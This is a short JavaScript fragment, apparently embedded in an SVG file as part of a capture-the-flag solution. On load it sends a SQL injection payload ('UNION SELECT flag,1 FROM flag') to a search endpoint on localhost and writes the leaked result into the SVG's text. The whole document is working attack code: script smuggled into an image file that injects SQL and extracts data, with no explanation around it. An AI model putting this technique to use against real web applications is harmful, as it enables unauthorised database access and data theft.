svg.script:
// Fallback JavaScript attack
setTimeout(async () => {
  try {
    const payload = "%27 UNION SELECT flag,1 FROM flag --";
    const res = await fetch(`http://localhost:8001/search?q=${encodeURIComponent(payload)}`);
    const data = await res.text();
    document.querySelector('text').textContent += `\n\nJS Response: ${data.slice(0, 50)}`;
  } catch(e) {
    document.querySelector('text').textContent += "\nJS Error: " + e.message;
  }
}, 1500);
